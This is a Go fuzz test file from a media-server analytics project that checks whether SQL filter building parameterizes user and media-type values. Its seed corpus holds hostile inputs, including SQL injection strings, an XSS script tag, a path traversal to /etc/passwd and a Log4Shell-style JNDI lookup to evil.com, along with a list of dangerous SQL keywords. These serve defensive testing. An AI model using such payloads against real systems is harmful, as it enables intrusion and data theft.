// Cartographus - Media Server Analytics and Geographic Visualization
// Copyright 2026 Tom F. (tomtom215)
// SPDX-License-Identifier: AGPL-3.0-or-later
// https://github.com/tomtom215/cartographus

package database

import (
	"strings"
	"testing"
	"time"
)

// FuzzBuildFilterConditions tests SQL injection prevention in filter building
func FuzzBuildFilterConditions(f *testing.F) {
	// Seed corpus with typical and malicious filter values
	f.Add("admin")
	f.Add("user1")
	f.Add("")
	f.Add("'; DROP TABLE playback_events; --")
	f.Add("admin' OR '1'='1")
	f.Add("admin' UNION SELECT * FROM users --")
	f.Add("1' OR 1=1; --")
	f.Add("\x00admin")
	f.Add("admin\x00")
	f.Add("admin\nadmin")
	f.Add("<script>alert('xss')</script>")
	f.Add("${jndi:ldap://evil.com/a}") // Log4Shell-style
	f.Add("../../etc/passwd")
	f.Add(string(make([]byte, 10000)))

	f.Fuzz(func(t *testing.T, username string) {
		// Create filter with fuzzed username
		filter := LocationStatsFilter{
			Users: []string{username},
		}

		// Build filter conditions - should never panic
		whereClauses, args := buildFilterConditions(filter, false, 1)

		// Verify parameterized query structure
		if len(whereClauses) > 0 {
			whereClause := whereClauses[0]

			// Check for SQL injection: the raw username value should NOT appear in the WHERE clause
			// However, we need to exclude false positives where:
			// 1. The username is a substring of expected SQL syntax (e.g., "a" in "username")
			// 2. The username matches SQL keywords exactly
			//
			// The expected WHERE clause format is: "username IN (?)" or "username IN ($1)"
			// So we strip out the expected SQL syntax and check if username appears in what's left
			expectedSQLParts := []string{"username", "IN", "(", ")", "?", "$", " ", ","}

			// Build what the WHERE clause looks like without expected SQL parts
			testClause := whereClause
			for _, part := range expectedSQLParts {
				testClause = strings.ReplaceAll(testClause, part, "")
			}
			// Also remove positional params like $1, $2, etc.
			for i := 1; i <= 10; i++ {
				testClause = strings.ReplaceAll(testClause, "$"+string(rune('0'+i)), "")
			}

			// If after removing expected SQL parts, the username still appears, that's suspicious
			// But also skip if the username is very short (1-2 chars) as it could be a substring of many things
			if len(username) > 2 && username != "" && strings.Contains(testClause, username) {
				t.Errorf("WHERE clause contains raw username value (SQL injection risk): %q", whereClause)
			}

			// WHERE clause should use parameterized placeholder
			if !strings.Contains(whereClause, "?") && !strings.Contains(whereClause, "$") {
				t.Errorf("WHERE clause missing parameterized placeholder: %q", whereClause)
			}

			// WHERE clause should not contain suspicious SQL keywords after username
			dangerousPatterns := []string{
				"DROP", "DELETE", "UNION", "SELECT",
				"INSERT", "UPDATE", "ALTER", "CREATE",
				"EXEC", "EXECUTE", "--", "/*",
			}
			upperClause := strings.ToUpper(whereClause)
			for _, pattern := range dangerousPatterns {
				// Pattern should only appear if it's part of valid SQL syntax
				// Not as injected content
				if strings.Contains(upperClause, pattern+" ") ||
					strings.Contains(upperClause, " "+pattern) {
					// This might be OK if it's part of the generated SQL
					// But the actual username value should be in args, not the clause
				}
			}
		}

		// Args should contain the actual username value
		if len(args) > 0 {
			foundUsername := false
			for _, arg := range args {
				if strArg, ok := arg.(string); ok && strArg == username {
					foundUsername = true
					break
				}
			}
			if !foundUsername && username != "" {
				t.Error("Args does not contain username value (should be parameterized)")
			}
		}
	})
}

// FuzzBuildFilterConditionsMultipleUsers tests filter with multiple user values
func FuzzBuildFilterConditionsMultipleUsers(f *testing.F) {
	// Seed corpus with various user combinations
	f.Add("user1", "user2", "user3")
	f.Add("admin", "", "guest")
	f.Add("'; DROP TABLE users; --", "admin", "user")
	f.Add("user1", "user1", "user1") // Duplicates

	f.Fuzz(func(t *testing.T, user1, user2, user3 string) {
		filter := LocationStatsFilter{
			Users: []string{user1, user2, user3},
		}

		whereClauses, args := buildFilterConditions(filter, false, 1)

		if len(filter.Users) > 0 && len(whereClauses) > 0 {
			// Should generate IN clause with correct number of placeholders
			expectedPlaceholders := len(filter.Users)
			actualPlaceholders := strings.Count(whereClauses[0], "?")

			if actualPlaceholders != expectedPlaceholders {
				t.Errorf("Placeholder count mismatch: got %d, want %d", actualPlaceholders, expectedPlaceholders)
			}

			// Args should match filter users count
			if len(args) != len(filter.Users) {
				t.Errorf("Args count mismatch: got %d, want %d", len(args), len(filter.Users))
			}

			// WHERE clause should be valid IN syntax
			if !strings.Contains(whereClauses[0], "IN (") {
				t.Error("WHERE clause missing IN clause for multiple users")
			}
		}
	})
}

// FuzzBuildFilterConditionsMediaType tests media type filter
func FuzzBuildFilterConditionsMediaType(f *testing.F) {
	f.Add("movie")
	f.Add("episode")
	f.Add("track")
	f.Add("")
	f.Add("movie' OR '1'='1")
	f.Add("<script>alert('xss')</script>")

	f.Fuzz(func(t *testing.T, mediaType string) {
		filter := LocationStatsFilter{
			MediaTypes: []string{mediaType},
		}

		whereClauses, args := buildFilterConditions(filter, false, 1)

		if len(whereClauses) > 0 {
			whereClause := whereClauses[0]

			// Verify placeholder is used (not raw value injection)
			if !strings.Contains(whereClause, "?") {
				t.Error("WHERE clause missing parameterized placeholder")
			}

			// Check that raw value doesn't appear OUTSIDE of SQL syntax keywords
			// Exclude false positives where mediaType is a substring of SQL keywords like "IN", "type", "(", ")"
			sqlKeywords := []string{"media_type", "IN", "(", ")", " ", "?"}
			isSQLKeyword := false
			for _, keyword := range sqlKeywords {
				if mediaType == keyword || strings.TrimSpace(mediaType) == keyword {
					isSQLKeyword = true
					break
				}
			}

			// Only flag as SQL injection if value appears in clause and it's not a SQL keyword
			if !isSQLKeyword && mediaType != "" && strings.Contains(whereClause, mediaType) {
				// Check if it appears outside the expected "media_type IN (?)" pattern
				expectedPattern := "media_type IN (?)"
				if whereClause != expectedPattern {
					t.Errorf("Media type not parameterized (SQL injection risk): %q", whereClause)
				}
			}
		}

		// Verify value is passed as arg
		if len(args) > 0 {
			if strArg, ok := args[0].(string); ok {
				if strArg != mediaType {
					t.Errorf("Args mismatch: got %q, want %q", strArg, mediaType)
				}
			}
		} else if len(filter.MediaTypes) > 0 {
			t.Error("Filter has media types but no args were generated")
		}
	})
}

// FuzzBuildFilterConditionsDateRange tests date range filter with edge cases
func FuzzBuildFilterConditionsDateRange(f *testing.F) {
	// Seed with various timestamps (as int64 Unix seconds)
	f.Add(int64(0))                 // Unix epoch
	f.Add(int64(1704067200))        // 2024-01-01
	f.Add(int64(-1))                // Before epoch
	f.Add(int64(253402300799))      // Year 9999
	f.Add(int64(time.Now().Unix())) // Now
	f.Add(int64(9999999999999))     // Far future

	f.Fuzz(func(t *testing.T, startUnix int64) {
		startDate := time.Unix(startUnix, 0)
		endDate := startDate.Add(24 * time.Hour)

		filter := LocationStatsFilter{
			StartDate: &startDate,
			EndDate:   &endDate,
		}

		whereClauses, args := buildFilterConditions(filter, false, 1)

		// Should generate 2 WHERE clauses (start and end)
		if filter.StartDate != nil && filter.EndDate != nil {
			if len(whereClauses) < 2 {
				t.Error("Missing WHERE clauses for date range")
			}

			// Should have 2 args
			if len(args) < 2 {
				t.Error("Missing args for date range")
			}

			// Start date should be before or equal to end date in args
			if len(args) >= 2 {
				if startTime, ok := args[0].(time.Time); ok {
					if endTime, ok := args[1].(time.Time); ok {
						if startTime.After(endTime) {
							// This is allowed by the filter but might be logically incorrect
							// The application should validate this at a higher level
						}
					}
				}
			}
		}
	})
}

// FuzzBuildFilterConditionsPositionalParams tests PostgreSQL-style positional parameters
func FuzzBuildFilterConditionsPositionalParams(f *testing.F) {
	f.Add("admin", "movie")

	f.Fuzz(func(t *testing.T, username, mediaType string) {
		filter := LocationStatsFilter{
			Users:      []string{username},
			MediaTypes: []string{mediaType},
		}

		// Test with positional parameters ($1, $2, etc.)
		whereClauses, args := buildFilterConditions(filter, true, 1)

		if len(whereClauses) > 0 {
			// Should use $N style placeholders, not ?
			combinedClauses := strings.Join(whereClauses, " ")
			if strings.Contains(combinedClauses, "?") {
				t.Error("Positional params mode should not use ? placeholder")
			}

			// Should contain $1, $2, etc.
			if !strings.Contains(combinedClauses, "$") {
				t.Error("Positional params mode should use $N placeholders")
			}

			// Verify parameterized query structure by validating WHERE clause format
			// Expected format: "column_name IN ($1, $2, ...)"
			// The placeholder section should ONLY contain: $, digits, commas, and spaces
			for _, clause := range whereClauses {
				// Each clause should start with a known column name
				if !strings.HasPrefix(clause, "username IN (") && !strings.HasPrefix(clause, "media_type IN (") {
					t.Errorf("Unexpected WHERE clause structure: %q", clause)
					continue
				}

				// Extract and validate the placeholder section
				startParen := strings.Index(clause, "(")
				endParen := strings.LastIndex(clause, ")")
				if startParen >= 0 && endParen > startParen {
					placeholderSection := clause[startParen+1 : endParen]
					// Should only contain: digits, $, comma, space
					for _, ch := range placeholderSection {
						if ch != '$' && ch != ',' && ch != ' ' && (ch < '0' || ch > '9') {
							t.Errorf("Unexpected character '%c' in placeholder section: %q", ch, clause)
							break
						}
					}
				}
			}
		}

		// Args should contain actual values
		expectedArgCount := 0
		if len(filter.Users) > 0 {
			expectedArgCount += len(filter.Users)
		}
		if len(filter.MediaTypes) > 0 {
			expectedArgCount += len(filter.MediaTypes)
		}

		if len(args) != expectedArgCount {
			t.Errorf("Args count mismatch: got %d, want %d", len(args), expectedArgCount)
		}
	})
}

// FuzzBuildFilterConditionsLargeArray tests performance with large filter arrays
func FuzzBuildFilterConditionsLargeArray(f *testing.F) {
	// Note: This is more of a DoS/performance test
	f.Add(10)
	f.Add(100)
	f.Add(1000)

	f.Fuzz(func(t *testing.T, userCount int) {
		// Limit to prevent OOM in fuzzing
		if userCount < 0 || userCount > 10000 {
			return
		}

		users := make([]string, userCount)
		for i := 0; i < userCount; i++ {
			users[i] = "user" + string(rune(i%26+97)) // a-z
		}

		filter := LocationStatsFilter{
			Users: users,
		}

		// Should not panic or OOM
		whereClauses, args := buildFilterConditions(filter, false, 1)

		// Placeholder count should match user count
		if len(users) > 0 && len(whereClauses) > 0 {
			expectedPlaceholders := len(users)
			actualPlaceholders := strings.Count(whereClauses[0], "?")

			if actualPlaceholders != expectedPlaceholders {
				t.Errorf("Placeholder count mismatch with large array: got %d, want %d",
					actualPlaceholders, expectedPlaceholders)
			}
		}

		// Args should match user count
		if len(args) != len(users) {
			t.Errorf("Args count mismatch with large array: got %d, want %d", len(args), len(users))
		}
	})
}
